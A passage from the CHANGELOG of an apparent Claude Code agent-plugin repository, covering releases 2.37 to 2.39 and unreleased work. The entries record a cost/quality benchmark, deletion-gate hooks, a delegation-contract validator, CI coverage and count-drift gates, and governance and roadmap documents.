  the threshold-meeting runs, reporting "0 completed runs, metric
  undefined" rather than silently computing a mean over an empty list. The
  existing all-valid-runs metric is kept, unchanged, for comparability.
  `review_small_diff`'s threshold (5/10) is a **documented exception** to
  that rule, not an example of it: its 10 runs were already committed to
  `main` by #121 before this field existed, so the value was chosen with
  the resulting quality scores (7-10/10) already visible -- a retrospective
  criterion, stated as such in the task JSON and README, not a blind
  pre-registration. Re-run against the committed 2026-09-05 raw data it
  shows 100% completion both conditions -- the qualitative conclusion
  (non-inferiority not established; token and
  dollar-cost proxies disagree in direction) is unchanged.

- **`tools/bench-agent-cost/`: pre-registered paired cost/quality benchmark
  (Phase 3 of the agent-to-skill migration plan) (#121).** A Fisher-style tool
  comparing inline skill execution vs. full subagent spawn for the same
  task, holding model, effort, tool grant, and git snapshot constant, with
  randomized A/B order, minimum 5 paired replications, blind two-evaluator
  quality scoring, a pre-registered non-inferiority margin (1.0 point on a
  10-point rubric), and a full reproducibility-manifest sidecar per run.
  Token/wall-clock/CLI-reported cost are documented throughout as
  operational-cost proxies only, per a green-software domain-expert
  consult incorporated into the design doc; an SCI disclaimer states
  energy, grid intensity, and embodied carbon are not measurable from this
  vantage point and no carbon claim is made. Gate run executed live
  (haiku/low smoke run, 10 real `claude -p` invocations, 1 task x 5
  replications x 2 conditions) before merge; found and fixed a real bug in
  the tool's own dirty-tree check along the way (the benchmark's own
  output directory was making its own next run see a dirty tree).

- **`tools/tests/discoverability-baseline/`: labeled routing-precision
  baseline for the 97 genius agents' discoverability (Phase 3) (#121).** A
  26-prompt hand-labeled corpus measuring routing precision/recall against
  `rules/skill-routing-table.md`'s 15 GOA shapes, replacing a raw "was the
  file read" count that proves nothing about correctness. Per the plan's
  explicit non-goal: this raises consultation, it is never used to argue
  for pruning the genius layer. New regression suite (36th, was 35) runs
  the pure precision/recall math in CI; the live router call is a separate,
  manually-run script.

### Changed

- **Rules are installed under `~/.claude/reference/`, not `~/.claude/rules/` (#129).**
  Claude Code loads every Markdown file under `~/.claude/rules/` at launch, so
  the routing table, coding standards and the agent-reference documents were
  re-sent on every turn although agents only Read them on demand.
  `scripts/setup.sh` now stages `rules/` to `~/.claude/reference/` and every
  absolute reference follows. Owner correction 2026-09-08: CLAUDE.md should
  be nearly empty; the host loads what it needs when it needs it.

- **Worktrees live inside the repository (owner correction 2026-09-08, #128).**
  `scripts/spawn-agent.sh` now creates its worktree at
  `<target-repo>/.claude/worktrees/<agent>-<timestamp>` instead of a sibling
  directory beside the repo, and warns when `.claude/worktrees/` is not
  gitignored in the target. `rules/agent-reference/worktree-protocol.md` and
  `agents/orchestrator.md` Move 4 no longer recommend the sibling-directory
  convention or `~/.claude/worktrees/`: the only sanctioned location is the
  one Claude Code's own worktree mechanism and cleanup sweep use. Outside
  worktrees were invisible to that sweep and had accumulated (43 detached
  plus 33 branch worktrees under `/private/tmp/cortex-green-*` on one
  machine). `.claude/worktrees/` is now gitignored in this repo too.

- **CLAUDE.md is short again; its body moved to `docs/agent-guidance.md` (#132).**
  Owner ruling 2026-09-08: CLAUDE.md is re-sent to the model on every turn,
  so it carries the one-line project description, the build/test/gate
  commands and at most three non-negotiables. The two
  `@~/.claude/reference/...` import lines (about 50K characters re-imported
  each turn) are dropped, and the etiquette line "Do not merge your own PR
  without the owner's go-ahead" is retired. A pull request merges when CI is
  green and a review verdict is posted on it.

- **GitHub Actions pins bumped as a group (#115).** actions/checkout 4.2.2 to
  7.0.1, astral-sh/setup-uv 9.0.0 to 10.0.1, github/codeql-action 4.37.4 to
  4.37.9, actions/attest-build-provenance 4.1.1 to 4.2.2,
  softprops/action-gh-release 3.0.2 to 3.0.3.


## [2.39.0]: model-tier escalation banners, the agent-vs-skill classification rule, and the genius-agent Agent-tool registration retired

### Fixed

- **The 97 `agents/genius/*.md` reasoning-pattern agents were auto-registered as
  invocable Agent-tool subagents with zero measured usage.** An audit of every
  past Claude Code session transcript (~768MB across 31 projects) found 97 of
  98 genius agents were never invoked via the Agent tool, and the one that was
  (`lamport`, once) was never run in parallel with anything, no isolation or
  parallelism benefit was ever exploited, and tool restriction was already
  ruled out (every genius agent shares the orchestrator's own toolset).
  `/genius-invoke`, `/genius-compose`, and `/genius-route` already cover this
  ground more cheaply: all three read `agents/genius/<name>.md` directly and
  apply the pattern inline, no subagent spawn. `plugin.json` now declares an
  explicit `agents` array listing only the 23 team agents, so Claude Code no
  longer auto-registers the genius agents as a second, redundant invocation
  path. **The genius agent files themselves are untouched**, still fully
  readable by the three commands above, still 97 in number, still never a
  removal candidate under this repo's own standard. Also re-synced
  `plugin.json`'s embedded hooks copy against `hooks/hooks.json` (authoritative
  since the Stop-hook dedup fix, `4bd2f1d0`), which had drifted and still
  carried the duplicate registration that fix already resolved in the
  canonical file.

### Added

- **`rules/agent-vs-skill-classification.md`: five-test rule deciding whether a
  team agent may be inlined as a skill (#120).** Tests are tool-grant
  guardrail, isolation need, model-tier delta from the `sonnet` baseline
  (`tools/skill-runner.sh:31,35`), packaged assets, and authority transfer.
  Applied as a worked table over all 23 team agents with per-agent file:line
  evidence: 9 subagent-only, 1 dual-surface, 13 skill-frontable. A verdict is
  a candidacy, never an authorization to remove an agent, and the rule is
  scoped to `agents/*.md` only, never to the 97 genius agents. Two premises
  the plan asked the table to assume were checked and corrected against
  `origin/main`: `agents/ux-designer.md:8` no longer carries the narrow
  read-only tool grant its dual-surface staging was justified by (widened in
  #116, commit `4006565`, as a frontmatter-vs-body consistency fix), and
  `refactorer` is named by no skill's `agents:` field. Recorded follow-up:
  #119's escalation banner keys on model tier only, so it stays silent for
  the four subagent-only agents that sit at the sonnet baseline
  (code-reviewer, git-historian, research-scientist, reviewer-academic).

- **`tools/skill-runner.sh` model-tier escalation banner (#119).** A skill
  whose `agents:` frontmatter names an agent above the sonnet baseline
  (opus, fable) now gets a `!!! MODEL-TIER ESCALATION REQUIRED !!!` banner
  before the procedure body, naming the agent and directing the caller to
  spawn it as a real subagent instead of inlining its procedure at the
  caller's own tier. `commands/skill/run.md` is updated to act on it.
  `scripts/generate-skill-agent-model-matrix.py` computes the full
  skill-to-agent-to-model matrix from the tree (`docs/skill-agent-model-matrix.md`,
  drift-checked): 65 skill files carry a non-empty `agents:` field, and 63
  of them name at least one escalation-tier agent.

- **Delegation-contract schema + fail-closed validator (#116).** `schemas/delegation-contract.schema.yaml`
  declares ownership, worktree policy, push authority, handback artifacts, an
  external acceptance oracle, model, tool grant, and checkpoint policy for
  any `scripts/spawn-agent.sh` delegation. `tools/delegation_contract.py`
  (stdlib-only, no new dependency) validates it and is now called BEFORE
  `git worktree add`: a missing, malformed, or ownership-overlapping
  contract is denied with a non-zero exit and creates nothing.

- **Strict, full-tree frontmatter validator (#116).** `tools/frontmatter_validator.py`
  parses every declared frontmatter block under `skills/`, `agents/`
  (incl. `agents/genius/`), `commands/`, and the packaged
  `plugins/*/skills/` surface with PyYAML's strict `safe_load`, reporting
  stable `{file, line, rule}` records. Found and fixed 7 skill files whose
  unquoted `input:`/`output:` values contained a colon-space, parsed as a
  nested mapping key.

### Fixed

- **`scripts/spawn-agent.sh` created a git worktree before any precondition
  check (#116).** No ownership, scope, push-authority, handback, or
  acceptance-oracle validation happened before the mutation. It now calls
  `tools/delegation_contract.py` first and refuses to create anything on an
  invalid or missing contract. A follow-up review found that three of its
  `VAR="$(cmd)"` assignments were bare statements under `set -e`, which
  triggers on the assignment's own exit status before a subsequent
  `VAR_RC=$?` check runs: a rejected contract exited 1 with the intended
  "deny: ..." reason silently swallowed. Moved each into an `if !` condition
  (exempt from `set -e` by design) so the reason reaches stderr.

- **Push authority was stated three different, contradictory ways (#116).**
  The generated zetetic-spine text (`scripts/generate-spine.py`) said "push,
  and hand back immediately" unconditionally; ~116 agents' own inline
  `<worktree>` sections said "do NOT push"; `worktree-protocol.md` already
  said push is delegation-controlled. All three now defer to the delegation
  contract's `push_authority` field, surfaced at runtime as
  `DELEGATION_PUSH_AUTHORITY`. Also fixed in the same pass: `ux-designer.md`
  declared tools omitted `Bash`/`Edit`/`Write` despite its required
  procedures using them, and `orchestrator.md`'s frontmatter selected
  `model: fable` while its token-budget prose described Opus's budget.

## [2.38.0]: deletion-gate Tier 2/3, mechanically enforced push authority, and a duplicated Stop hook fixed

### Fixed

- **Two plugins registered the same `Stop` hook simultaneously, firing the
  checkpoint-threshold block twice per crossing at two different token
  counts a few tool calls apart** (`context-guard@session-optimizer-marketplace`
  and this plugin's own copy of `stop-context-guard.py`), the exact "double
  execution for users with both installed" failure the session-optimizer
  deprecation shim already documents as forbidden. `context-guard` already
  owns this hook; the duplicate registration here is removed, and the
  remaining copy is gated on real session activity rather than an absolute
  token threshold alone: 12 of 13 audited Cortex sessions already started
  above the Sonnet WARN threshold on inherited context with zero tool
  calls, so the old threshold discriminated nothing. WARN now asks for a
  direct checkpoint write instead of spawning `memory-writer` for a ~55-66K
  token round trip to write a checkpoint that often said nothing happened;
  `memory-writer` stays available as an explicit fallback. This also drops
  the repo's lifecycle-hook count from 21 to 20 (`README.md`, `CONTRIBUTING.md`
  updated to match).

- **`requirements-dev.lock` disagreed with a fresh resolve of `requirements-dev.txt`
  (#117).** The committed lock pinned `pygments==2.20.0`; CI's `Python Suite +
  Coverage Gate` recompiles the lock on every run and diffs it, and PyPI's
  current release is `2.21.0`. Synced the lock entry to the version and
  hashes from a passing CI compile. A local `uv cache clean` + `--refresh`
  recompile on the maintainer's machine still resolved `2.20.0`, an
  unexplained local/CI resolver discrepancy not investigated further here.

- **The native git commit gate (`.githooks/pre-commit` + `commit-msg`, #110) was
  live in exactly one of the owner's five repositories.** Both hooks resolved
  their tools directory as `$(git rev-parse --show-toplevel)/tools`, correct
  only in zetetic-team-subagents' own clone. Pointed at from any other repo via
  `core.hooksPath`, that path does not exist, so the hook printed a `WARNING`
  and exited 0. Measured 2026-08-10: session-optimizer, cortex-viz,
  ai-architect-mcp-spec and ai-architect-mcp-codebase all had zero active
  `.git/hooks` and no branch protection requiring an equivalent CI job, so a
  direct `git commit` in four of the five repos was gated by nothing at all.

  `.githooks/lib/resolve-tools.sh` (new, sourced by both hooks) derives the
  shared engine's location from the hook FILE's own on-disk path
  (`BASH_SOURCE`), not from the committing repo. Confirmed in a scratch
  clone that an absolute, out-of-repo `core.hooksPath` fires correctly and
  `git rev-parse --show-toplevel` inside the hook still resolves to the
  *committing* repo. `resolve_tool()` prefers a target repo's own vendored
  copy of `deletion-gate.sh`/`zetetic-checker.sh`/`craftsmanship-checker.sh`,
  then falls back to this clone's: one engine, five repos, nothing vendored.

  `require_tool()` replaces the old warn-and-exit-0 fallback with a BLOCK.
  Once a repo is wired, `tools/<name>` is a physical sibling of the hook file
  inside the same clone; the only way it goes missing is a corrupted or
  partial plugin clone, meaning "I could not tell," never "this repo
  legitimately has no gate" (an unwired repo never reaches this code:
  `core.hooksPath` is unset, so git invokes nothing). Verified against a
  deliberately gutted plugin clone: the commit is now BLOCKED with a
  diagnostic, not silently passed.

  `tools/install-git-hooks.sh` gained `--repo <path>` and `--all` (reads the
  new `tools/git-hooks-fleet.txt` sibling-repo manifest) and always points
  `core.hooksPath` at this clone's `.githooks/` by absolute path, including
  for this repo's own clone: one code path, idempotent (`wired` vs
  `unchanged`). **`core.hooksPath` is per-clone LOCAL git config
  (`.git/config`) and is never committed.** A fresh clone of any of the five
  repos starts unwired regardless of this change, and stays unwired until
  `install-git-hooks.sh` (or `--all`) is run in that clone. That is not a gap
  in this fix; it is the git property this script exists to close
  reproducibly, and it has to be re-run per clone, not once per repository.

  Adversarial verification (scratch clones, never the owner's real repos): a
  commit removing a function while a second, untouched file still calls it is
  BLOCKED by `pre-commit` before `commit-msg` runs; the same removal with the
  caller migrated inline and a `Retired-Because:` trailer is ACCEPTED.
  `install-git-hooks.sh --all` applied to the real five repos, run twice:
  first run wired the four previously-uncovered repos, second run reported
  `unchanged` on all five. (#111)

### Added

- **Deletion gate, Tier 2 and Tier 3: the net for a removal that never goes
  through an Edit/Write, plus the native-git backstop for a commit made
  outside Claude Code.** #109 shipped Tier 1 only (`hooks/pre-tool-deletion-gate.py`,
  PreToolUse on `Edit`/`Write`), structurally blind to a removal made via
  Bash (`sed`/`rm`/`git rm`/a patch), a whole-file `Write` with no
  `old_string`, or a multi-step accumulation. `hooks/post-tool-deletion-gate.py`
  (PostToolUse on `Edit`/`Write`/`Bash`) closes that gap: it diffs HEAD
  against the real on-disk tree (`tools/deletion_gate.py --worktree`, backed
  by the new `tools/deletion_gate_git.py`) after every tool call, catching
  the shape Tier 1 cannot see. `.githooks/pre-commit` + `.githooks/commit-msg`
  close a second gap: this repo's `main` carries no branch protection
  (verified 2026-08-10), so a direct `git commit` outside Claude Code
  bypassed every existing tier; the native pair now runs the same gate
  (survivors at pre-commit, the `Retired-Because:` trailer at commit-msg,
  since the message does not exist until then).

  Every BLOCK message across all tiers now directs the reader to the fix
  rather than just naming the failure (Anthropic, "Writing tools for
  agents": a tool's error text is its only interface): what was removed,
  who still calls it and where (showing the true total when truncating,
  never a silent cut), the normal-repair path, and, if removal is genuinely
  intended, migrate the callers first and give the reason last.

  Two correctness bugs found by dogfooding the gate against its own commits,
  both self-caught by `.githooks/commit-msg` before either reached a test
  fixture: rename/move detection was checked AFTER the survivor grep instead
  of before, so a well-formed move's own new call site looked like a stale
  caller and blocked its own author; and a survivor inside a file the
  CURRENT diff already touched was treated the same as one in a file the
  diff never went near, when the incident's own commit message names that
  distinction as exactly what let its missing callers go unnoticed. Both
  fixed with regression cases in both the pytest and the shell suite.

  Verified against the real cortex-viz commit 45d4a80 again after both
  fixes: still blocks, still names `graph_build_run.py:234`,
  `graph_build_run.py:155` and `graph_build_merge.py:136`. 37 end-to-end
  shell cases (`tools/tests/deletion-gate/`), 127 pytest cases across the
  six deletion-gate Python modules at 95-100 percent coverage each (repo
  total 88 percent, floor 80 percent). (#110)

- Every agent now carries a repair-before-remove rule in its zetetic spine
  (#108): deleting the thing that has the defect is not fixing the defect.
  Removal is a design decision needing a justification of its own, apart from
  the bug; when the bug IS the reason offered, it is not a reason. The tell is
  that this never arrives as avoidance but as cleanup, justified by a claim of
  absence that §1 already forbids taking on faith. Measured 2026-08-10 on
  `cortex-viz`: three module forwarders were deleted as having "never had a
  caller in this repository's history" when they had four, the released 3.1.0
  could not build a graph at all, and the parameter drift that actually
  motivated the deletion went unfixed. A second defect explains why it survived
  a release: the failure that would have reported it was swallowed by a bare
  `except Exception: pass`. A deletion and a silent handler cover for each
  other. `spine_block` was split into `_procedure()` and `STANDING_RULES` when
  the addition crossed the 50-line cap, output byte-identical.

- Every agent now carries a hand-back rule in its zetetic spine (#107): finish,
  run only the checks short enough to complete in your own thread, push, and
  hand back immediately with the PR number and the exact sha. Waiting on a
  15-20 minute pipeline belongs to whoever delegated the work. An agent cannot
  hold one: it either parks on a monitor nothing wakes, or it is killed
  mid-block, and both end with a report that never arrives. Measured 2026-08-10,
  five agents on five unrelated contracts, two of them after being told
  explicitly not to. The exception is stated rather than left to judgement: a
  short check that IS the deliverable's proof stays with the agent, because a
  registry query answering in seconds is the evidence where a green publish job
  is not. Generated into 119 agents by `scripts/generate-spine.py`; the
  generator is edited, never the outputs.
- **Deletion gate: a removed top-level definition either has no surviving
  caller and a reason, or it does not ship.** Prose telling agents "removal
  needs its own justification, a defect is not one" was violated the day
  after it was written (cdeust/cortex-viz commit 45d4a80 removed three
  module-level forwarders justified as "never had a caller in this
  repository's history", but they had four, in files the diff never touched;
  the release could not build a graph). `tools/deletion_gate.py` +
  `tools/deletion_gate_lang.py` make the pattern mechanically impossible to
  merge: for every removed top-level definition (Python/JS/TS/Rust/shell) it
  greps the post-change tree for surviving callers and blocks, names them; a
  rename or move (matched by body similarity, not name) passes with no
  rationale owed; a genuine no-survivor removal requires a `Retired-Because:`
  commit trailer that says more than the observation itself. Wired at three
  tiers: `hooks/pre-tool-deletion-gate.py` (PreToolUse, blocks the Edit/Write
  itself before it lands), the `deletion-gate` CI job (hard gate over the PR
  diff, `.github/workflows/ci.yml`), `tools/tests/deletion-gate/` (26
  end-to-end regression cases, including the shape of the incident, offline),
  and `tests/test_deletion_gate*.py` / `tests/test_pre_tool_deletion_gate.py`
  (93 pytest cases at 96-100 percent line coverage per module, so the shipped
  Python surface's 80 percent CI floor stays enforced rather than diluted by
  three new modules landing at 0 percent). Verified
  against the real cortex-viz commit 45d4a80: blocks, names
  `graph_build_run.py:234`, `graph_build_run.py:155` and
  `graph_build_merge.py:136` as the surviving callers. (#109)

## [2.37.0]: GOA Phase 0/Instrument B tooling, genius-bank coverage complete, and the engineering-loop restored

### Added
- **Four new problem-shaped skills complete genius-bank coverage (82/97 -> 97/97).** `experience-and-transmission`, `narrative-sensemaking`, `normative-design` and `representation-and-possibility` were the only skill-layer gaps left after the skills wave that shipped `zetetic-gates`; a genius agent the skill layer does not route to is unreachable in practice. Problem-shaped skills: 11 -> 15. Propagated through README, CONTRIBUTING, `marketplace.json`, `skills/_index.md` and `docs/COUNTING.md`, with eleven previously ungated README/COUNTING claims added to the doc-count registry so this class of drift (75 vs 76 skills, stale suite and tool counts) cannot recur silently. (#92)
- **GOA Phase 0: a replayable inter-rater-agreement protocol and scorer**, measuring agreement on the routing gold set before any router is scored. 351 mined cases, two blind labellers on a frozen rubric: Cohen's kappa 0.554, 39.0% shape-agreement on routable cases (replicates the earlier 120-case ceiling to three decimals). `tools/score_shape_labels.py` (Cohen 1960 / Fleiss 1971), `tools/mine_shape_cases.py`, and the frozen protocol/rubric/prompt under `docs/goa-phase0/`. The cases themselves are not published (verbatim project paths, 35 concern enterprise work); the protocol is replayable, the data is not. (#94)
- **GOA Phase 0: a cross-family replay report** (Codex GPT-5.6, three model IDs) validating the frozen 351-case gold set at 351/351 rows with no repair, published as evidence rather than adjudication: it does not resolve the seven three-way splits still pending human arbitration. (#98)
- **GOA Phase 0: the binding scorecard** (`docs/GOA-SCORECARD.md`): gold-set composition, the replicated agreement ceiling and its reporting rule, cross-family replay limits, declared biases and reproducibility gaps, the two-instrument design, and standing rules against quoting rates from selection-biased subsets. (#101)
- **GOA Phase 1: Instrument B curation pipeline** building the frozen `external_testbase_v1.json` fixture from archive.org's 2024-04-02 Stack Exchange dump (CC BY-SA 4.0) and the NTSB Zenodo record 17096333 (CC BY 4.0): score-stratified sampling, MinHash near-duplicate removal (Broder 1997), blind-batch construction with a two-labeler + 3rd-pass-adjudication protocol, and locally-derived fixture assembly that never stores raw corpus text. Two new CI hard gates (`tools/goa/no-raw-text-gate.sh`, `tools/goa/fixture-freeze-gate.sh`), 105 new pytest tests at 91% line coverage on `tools/goa`. (#99)
- **A generated skill-shape routing table with an anti-drift gate.** Each of the 15 problem-shaped skills gains a `shapes:` frontmatter field (sourced from `docs/goa-phase0/label-rubric.md`); `scripts/generate-skill-routing-table.py --check` fails CI on drift between that frontmatter and the committed `rules/skill-routing-table.md`. Codegen only, for the routing-artifact half of the GOA design; no router or abstention-gate behavior changed. (#102)
- **`/zetetic:engineering-loop` restored and the acceptance gate made global.** The command was advertised in the command surface and referenced in the past tense by ADR-003, but its definition existed nowhere on disk. Restored as a step-by-step procedure whose step 0 is naming the pass/fail check. `hooks/stop-acceptance-gate.py` now falls back to this plugin's own repo-generic runner and a global config when a repo has no vendored `tools/acceptance-gate.sh`, and `ABL_STOP_BLOCK=on` enables blocking machine-wide (the 2026-06-10 report-only default still governs where it is unset). `CLAUDE.md` now wires the global agent rules into this repo, which previously loaded neither `model-behavior.md` nor `coding-standards.md` for sessions working here. The three contract-violation refusals ("pre-existing", a skip, a red PR), root-cause-ends-the-contract, refusal-is-not-an-option, and the shortcuts-refused-by-default rule are stated explicitly where agents read them. (#103)
- **`tools/changelog-commit-check.sh`: a hard CI gate closing the exact hole this release's own postmortem found.** `CHANGELOG.md`'s `Unreleased` section stopped being updated after #89 and 14 of the 30 commits before this one went unrecorded, three of them `feat:` and four `fix:`, with nothing measuring the gap. The gate walks every `feat:`/`fix:`/`sec:`/`perf:` commit since the latest release tag and fails if its `(#NNN)` PR number is not cited anywhere in `CHANGELOG.md`'s not-yet-released content; `docs:`/`chore:` commits are not required. Fails closed on every unverifiable path (no tag, no matching section header, a required commit with no PR number of its own to check). 7-case regression suite under `tools/tests/changelog-commit-check/`, each case built against a throwaway git repository. (#106)

### Fixed
- **`requirements-dev.txt`'s four test dependencies were unpinned by hash** (Scorecard Pinned-Dependencies, code-scanning #40): any CI run could resolve to swapped bytes with no diff in this repository. `requirements-dev.lock`, compiled with `uv pip compile --generate-hashes --universal`, is now the only thing installed; a drift step recompiles and diffs against it. (#84)
- **122 agent/genius files carried a dead MCP tool-name prefix.** The codebase-intelligence server was renamed twice (`automatised-pipeline` -> `ai-architect-codebase` -> `ai-architect-mcp-codebase`, canonical since v0.9.0); the host silently drops a tool name it cannot resolve, so every agent lost code intelligence with no error line. The auditor's own allowlist had been hand-copied and carried the dead spelling too, so CI certified the defect it exists to catch. `.github/workflows/identity.yml` now derives the expected prefix from the producer's `mcp-contract.json` (pinned to a commit, not a movable tag) instead of restating it, and fails on any revoked prefix or allowlist drift. (#95, #97)
- **The zetetic-checker CI job reported blocking violations under a green build.** `|| echo "... (informational)"` swallowed the exit code, so a run printing "FAILED: 9 blocking violation(s)" still passed. Made blocking; the checker's own stimulus corpus (which exists to fire UNSOURCED) joins the generated/lock exclusion paths, and the one real hit is fixed at the source. The `zetetic-gates` plugin's copy of the checker is re-synced to match (see below). (#100)
- **`tools/tests/hook-layer/run-tests.sh` was registered nowhere and never ran** (issue #93): `run-all.sh`'s glob discovery matches only `tools/tests/<suite>/run-tests.sh`, so a suite nested one level deeper looks like coverage on disk while silently never executing. `check_no_orphan_suites()` compares `find tools/tests -name run-tests.sh` against the discovered set and fails closed on any mismatch, in both `--list` and run mode; the tools-tests CI job now runs this check before its own hard gate. `docs/COUNTING.md`'s `suites` row, previously unmonitored, is corrected (28 -> 31) and added to the drift registry. (#104)
- **Stale post-rename references to `automatised-pipeline`, `prd-spec-generator`
  and `cortex-viz`.** `README.md`'s companion-projects table and license
  footnote still linked `github.com/cdeust/prd-spec-generator` (a redirect,
  not a 404, which made the staleness easy to miss); `rules/coding-standards.md`
  named the same repo in its mutation-testing status line; and
  `tools/dev-symlink.map.example` pointed three cache-install paths and one
  dev-repo dir (`Cortex-live`, already removed) at names or directories that no
  longer exist. All four now name the current repos:
  `cdeust/ai-architect-mcp-spec` and the `hypermnesia-mcp`/`hypermnesia-mcp-viz`
  plugin keys. Comments that document the renames themselves
  (`.github/workflows/identity.yml`, `scorecard.yml`,
  `tools/agent-definition-auditor.sh`), the dated LinkedIn post record, the
  `.bestpractices.json` citation of the external OpenSSF project by its
  registered pre-rename name, and the ADR/audit files describing past
  decisions are unchanged on purpose: editing them would falsify the trace
  they exist to keep. (#105)
- **`memory/scope-registry.json`'s `cortex-viz` memory scope was never
  reconciled with the plugin's marketplace rename to `hypermnesia-mcp-viz`.**
  Directories already exist on users' disks at
  `~/.claude/memories/cortex-viz/`, the plugin's GitHub repo was not renamed,
  and this repo cannot verify which `MEMORY_AGENT_ID` the currently-shipped
  plugin binary writes under, so the old key is kept rather than dropped.
  Registered `hypermnesia-mcp-viz` as a second external-plugin scope,
  identical in shape, and documented the compatibility decision in
  `memory/scope-coverage.md`. Distinct registry scopes: 30 -> 31 (both
  counted values and the file's self-verification snippet updated together). (#105)

### Added
- **HTTPS-only validation at the web-ingest trust boundary.** Caller-supplied,
  redirected and discovered URLs now pass through one allowlist that requires
  absolute HTTPS, a host and no embedded credentials. Redirect downgrades and
  malformed URL forms fail closed before their response body is consumed, with
  offline regression tests covering every rejection path. This closes the
  OpenSSF Silver `crypto_used_network` and `input_validation` MUST gaps. The
  full pinned suite passes 969 tests with 97 percent statement coverage over
  the declared shipped surface; the 80 percent CI floor remains enforced. (#86)
- **Portable evidence synthesis for Codex and Gemini CLI.** A separately
  packaged `plugins/zetetic-reasoning` vertical slice exposes one skill and
  eight sourced reasoning references through a Codex marketplace manifest and
  a Gemini extension manifest. It deliberately carries no lifecycle hooks,
  server registration or team-agent roster. Contract tests pin versions and
  paths, validate the skill frontmatter, require source, refusal, uncertainty
  and blind-spot language, and reject host-specific runtime tokens from the
  portable package. The attested release bundle and SBOM now include it. (#85)
- **The Python suite runs in CI, gated on 80 percent coverage.** Before this,
  `grep -rn pytest .github/` returned nothing: the suites under `tests/` ran
  nowhere in CI, so a change that broke all of them landed green, and
  `pyproject.toml` declared `testpaths` for a runner nothing called. pytest now
  runs on push and pull_request as a hard gate, with `coverage.py` in the same
  job and `fail_under = 80` over the shipped Python surface (`hooks/` plus
  `tools/`). Scope, floor and exclusions are declared in `pyproject.toml` rather
  than in flags, so a local run and CI cannot measure different things. (issue #71, #83)
- **625 new tests, taking Python coverage from 21 percent to 99.** Every shipped
  Python file is now at 97 percent or above. The two the issue named as
  highest-consequence and at zero, the credential denylist
  `hooks/pre-tool-secret-shield.py` and the memory ACL surface
  `tools/memory-mcp-server.py`, are at 98 and 99 percent. Also newly covered:
  `web_extract` (100), `web_ingest` (98, driven entirely offline through a fake
  transport), `stop-acceptance-gate` (99), `stop-context-guard` (97, previously
  20 because the only exercise it got was a subprocess run),
  `stop-zetetic-spine` (99) and `gen-bundle-sbom` (98).
- **`docs/ASSURANCE-CASE.md`: the security argument, with its limits.** All four
  parts the OpenSSF criterion requires, each individually identifiable: the
  threat model with four tabulated adversaries; five trust boundaries enumerated
  concretely (release bundle to install path, marketplace install, hook
  invocation, tool invocation with model-supplied arguments, memory scope ACL);
  the secure-design argument; and eleven weakness classes against their
  counters. Three places where a control is weaker than it looks are stated
  rather than omitted: the secret shield fails open on malformed input by
  design, the memory ACL is permissive with no registry present and bypassable
  by environment, and the fetch path is a shape-and-transport control rather
  than a network sandbox. Linked from `SECURITY.md` and README.
- **`GOVERNANCE.md`: who decides, and what happens if they stop.** A decision
  model (the maintainer merges; a change needs every hard gate green plus a
  completion ledger; disagreements resolve on evidence in the open), a roles
  table naming each role and its holder, and a continuity section that separates
  what survives the maintainer becoming unavailable (MIT source, public history,
  Sigstore attestations anchored in a transparency log rather than a held key)
  from what stops (issue triage, merging, releases, the marketplace entry, the
  reporting domain). The bus factor is stated as 1 rather than softened, and
  fork-and-continue is described as weaker than a second maintainer rather than
  argued into sufficiency.
- **`docs/ROADMAP.md`: a documented 12-month plan** (2026-07-28 to 2027-07-28)
  with both halves the OpenSSF `documentation_roadmap` criterion asks for. Will
  do: finish silver then the four unmet-but-fixable criteria named individually;
  Python coverage to a blocking 80 percent then mutation testing as the strength
  measure; a recorded end-to-end autonomous-build-loop run on a foreign repo;
  roster growth under the counting gate. Will not do: sandboxing or runtime
  enforcement of refusals, a full port of the Claude-specific lifecycle to
  other hosts, any hosted service or telemetry, or localization. Every item
  states a Done-when condition naming the
  artifact that would exist or the number that would move.
- **`docs/COUNTING.md`: the counting convention.** Every quantity this project
  states about itself is defined once, with the exact command that produces it,
  plus the judgement calls it settles: an agent is a file carrying a `name:`
  field (so `agents/genius/INDEX.md`, a routing table, is not one); skills are
  11 problem-shaped entry points plus 65 category procedures; hooks are two
  distinct quantities, 19 lifecycle registrations and 20 scripts on disk.
- **`tools/doc-count-check.sh`: a hard CI gate** that recomputes all 25 claim
  instances in README, CONTRIBUTING and `marketplace.json` and fails on drift.
  It also fails when a registered pattern matches nothing, so rewording copy
  cannot silently leave a claim unchecked. 22-case regression suite.
- **`tests/run-all.sh`: one command that runs every suite.** It DISCOVERS the
  suites by glob (pytest under `tests/`, `tools/tests/*/run-tests.sh`,
  `scripts/test-*.sh`) instead of listing them, so adding or renaming a suite
  cannot make the docs stale. `--list` prints what it would run. 26 suites,
  fails closed: a missing `pytest` is reported as a failure, never skipped.
- **`tools/doc-command-check.sh`: a hard CI gate** asserting that every command
  a contributor-facing document tells the reader to run names a file this repo
  actually ships. Scoped to runnable positions inside fenced blocks; host paths,
  placeholders, `-m`/`-c` invocations and prompt-prefixed session transcripts
  are not path claims. 14-case regression suite under `tools/tests/`. (issue #73, #78)

### Fixed
- **PostToolUse git hooks no longer leak repository-resolution failures into
  the host session.** `post-commit-difficulty.sh` previously fell back to the
  hook process cwd; when a tool ran `git -C <repo> commit` from a non-git
  directory containing `tasks/`, its subsequent `git diff-tree` exited 128.
  Both post-commit advisory hooks now resolve `git -C`, the event workdir/cwd,
  and the process cwd in that order, and fail open if none is a repository.
  Command parsing stops at shell separators so an earlier `git -C` cannot leak
  into a later commit, and it follows the measured Claude Code form
  `cd <repo> && git commit`. Regression coverage asserts the exact selected
  repository under precedence conflicts as well as the exit-0 contract. (#89)
- **`tools/web_ingest.py` could not be imported under its package path.** A bare
  `import web_extract` worked only because `tools/web-ingest.sh` sets
  `PYTHONPATH`; `from tools import web_ingest` failed. It now tries the package
  import first and falls back, so both the shipped invocation and the dotted
  import (which the test suite and mutmut need) work.
- **Two test-isolation defects, both found by measuring rather than reading.**
  A `stop-acceptance-gate` test reached the REAL repository, ran the real
  acceptance gate for ~50 seconds, and passed for the wrong reason (the real
  gate happened to be green, not the code under test). A `stop-context-guard`
  test would have written to the developer's real
  `~/.claude/memories/checkpoints`. Both suites now redirect `HOME`, the state
  directory and the repo root into a per-test tmp tree.
- **Four files gave four different agent, skill and hook totals, and none
  matched the tree** (issue #72). README's badge claimed 119 agents while its
  footer claimed 118; CONTRIBUTING claimed 22 team agents, 64 skills and 18
  hooks; `marketplace.json` claimed 78 skills and 42 tools. The tree holds 97
  genius agents, 23 team agents, 76 skills, 19 hook registrations, 20 hook
  scripts, 26 commands and 44 tools. Every claim is regenerated from the
  convention and gated. (#79)
- Two test-count claims were not reproducible by any command: a `tests-288`
  badge and "241 tests passing" in the memory section. The bash suites report
